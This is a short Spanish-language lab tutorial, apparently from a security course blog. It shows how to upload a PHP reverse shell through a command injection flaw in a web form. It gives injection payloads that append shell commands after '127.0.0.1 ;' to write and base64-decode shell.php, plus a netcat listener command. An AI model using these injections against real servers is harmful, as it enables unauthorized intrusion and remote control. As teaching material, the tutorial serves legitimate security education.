---

typora-copy-images-to: ../assets/img
typora-root-url: ../
layout: post
categories:
conToc: true
title: Command Injection
---



# Command Injection



En la **siguiente práctica** vamos a realizar un *reverse shell* mediante la inyección  de comandos desde un campo de texto de un formulario que no realiza una validación de entrada correcta.

Este es una variante del ataque **FileUpload** ya que persigue almacenar un fichero ejecutable con dicho reverse shell.

## Paso 1

Descarga el archivo del *reverse shell* desde esta [dirección](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) y guárdalo como `shell.php`

## Paso 2

Edítalo y cambia la IP por la de tu equipo



## Paso 3

Ahora vamos a codificarlo en [base 64](https://www.base64encode.org/)

![command_injection](/assets/img/command_injection.png)

## Paso 4

Nos aprovecharnos de la vulnerabilidad para crear un archivo en el servidor mediante la siguiente entrada en el formulario:

```
   127.0.0.1 ; echo "pega-aquí-el-código-en-base64" > shell.txt 
```

Con este comando estamos creando el archivo `shell.txt` con el código en base64.

## Paso 5

Decodificamos el código mediante la siguiente entrada

```
   127.0.0.1 ; cat shell.txt | base64 -d > shell.php 
```

## Paso 6

Ya sólo nos queda ejecutar en el ordenador del atacante el comando `netcat`

```
nc -v -n -l -p 1234 
```



![commandinjection2](/assets/img/commandinjection2.png)
